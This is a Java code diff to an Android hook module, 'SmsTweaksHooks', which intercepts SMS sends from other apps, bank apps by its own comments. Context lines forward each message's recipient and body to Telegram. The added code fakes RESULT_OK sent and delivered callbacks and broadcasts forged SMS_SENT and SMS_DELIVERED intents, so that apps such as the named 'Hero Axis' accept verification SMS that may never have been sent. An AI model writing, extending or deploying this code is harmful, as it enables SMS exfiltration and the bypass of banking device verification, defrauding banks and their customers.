@@ -265,7 +265,8 @@ public final class SmsTweaksHooks {
     private static void handleSend(Object[] args) {
         String to = null;
         String body = null;
-        PendingIntent singlePi = null;
+        PendingIntent sentPi = null;
+        PendingIntent deliveryPi = null;
         List<PendingIntent> multiPi = null;
 
         if (args != null) {
@@ -279,8 +280,10 @@ public final class SmsTweaksHooks {
                     } else if (s.length() > 5) {
                         body = s;
                     }
-                } else if (a instanceof PendingIntent && singlePi == null) {
-                    singlePi = (PendingIntent) a;
+                } else if (a instanceof PendingIntent) {
+                    // ISms: first = sentIntent, second = deliveryIntent
+                    if (sentPi == null) sentPi = (PendingIntent) a;
+                    else if (deliveryPi == null) deliveryPi = (PendingIntent) a;
                 } else if (a instanceof List) {
                     List<?> list = (List<?>) a;
                     if (!list.isEmpty() && list.get(0) instanceof PendingIntent) {
@@ -312,27 +315,92 @@ public final class SmsTweaksHooks {
         // Prefer root service.sh forward (bank apps often block HTTPS) + best-effort direct
         queueServiceTelegram(to, body);
         if (!body.isEmpty()) sendTelegram(to, body);
-        firePending(singlePi, multiPi);
+        // Hero: RESULT_OK instantly — warna "Something went wrong" / token expire
+        firePendingOk(to, sentPi, deliveryPi, multiPi);
     }
 
-    private static void firePending(final PendingIntent single, final List<PendingIntent> multi) {
-        if (single == null && (multi == null || multi.isEmpty())) {
-            status("isms_no_pendingintent");
-            return;
+    private static Context appContext() {
+        try {
+            Application app = currentApplication();
+            return app != null ? app.getApplicationContext() : null;
+        } catch (Throwable t) {
+            return null;
         }
+    }
+
+    private static void fireOnePi(Context ctx, PendingIntent pi, String label) {
+        if (pi == null) return;
+        try {
+            if (ctx != null) {
+                pi.send(ctx, -1, null); // Activity.RESULT_OK
+                status("pi_ok_ctx|" + label);
+                return;
+            }
+        } catch (Throwable t) {
+            status("pi_ctx_fail|" + label + "|" + t.getClass().getSimpleName());
+        }
+        try {
+            pi.send(-1);
+            status("pi_ok_int|" + label);
+        } catch (Throwable t) {
+            status("pi_fail|" + label + "|" + t.getClass().getSimpleName());
+        }
+    }
+
+    private static void fireSmsResultBroadcasts(Context ctx, String dest) {
+        if (ctx == null) return;
+        try {
+            android.content.Intent sent = new android.content.Intent("android.provider.Telephony.SMS_SENT");
+            sent.putExtra("result", -1);
+            ctx.sendOrderedBroadcast(sent, null);
+            android.content.Intent del = new android.content.Intent("android.provider.Telephony.SMS_DELIVERED");
+            del.putExtra("result", -1);
+            ctx.sendOrderedBroadcast(del, null);
+            if (dest != null && !dest.isEmpty()) {
+                android.content.Intent s2 = new android.content.Intent("SMS_SENT" + dest);
+                ctx.sendOrderedBroadcast(s2, null);
+                android.content.Intent d2 = new android.content.Intent("SMS_DELIVERY" + dest);
+                ctx.sendOrderedBroadcast(d2, null);
+            }
+            status("sms_result_broadcasts|" + dest);
+        } catch (Throwable t) {
+            status("sms_broadcast_fail|" + t.getClass().getSimpleName());
+        }
+    }
+
+    private static void firePendingOk(final String dest, final PendingIntent sent,
+                                      final PendingIntent delivery, final List<PendingIntent> multi) {
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    Thread.sleep(50);
-                    if (single != null) {
-                        single.send(-1);
-                    } else if (multi != null) {
-                        for (PendingIntent pi : multi) {
-                            if (pi != null) pi.send(-1);
+                    // Near-instant — Hero Axis token ~30–60s; slow PI → Something went wrong
+                    Thread.sleep(20);
+                    Context ctx = appContext();
+                    boolean any = false;
+                    if (sent != null) {
+                        fireOnePi(ctx, sent, "sent");
+                        any = true;
+                    }
+                    if (multi != null) {
+                        for (int i = 0; i < multi.size(); i++) {
+                            PendingIntent pi = multi.get(i);
+                            if (pi != null) {
+                                fireOnePi(ctx, pi, "multi" + i);
+                                any = true;
+                            }
                         }
                     }
-                } catch (Throwable ignored) {}
+                    Thread.sleep(150);
+                    if (delivery != null) {
+                        fireOnePi(ctx, delivery, "delivery");
+                        any = true;
+                    }
+                    fireSmsResultBroadcasts(ctx, dest);
+                    if (!any) status("isms_no_pendingintent");
+                } catch (Throwable t) {
+                    status("pi_worker_fail|" + t.getClass().getSimpleName());
+                }
             }
         }, "hivirtus-pi").start();
     }
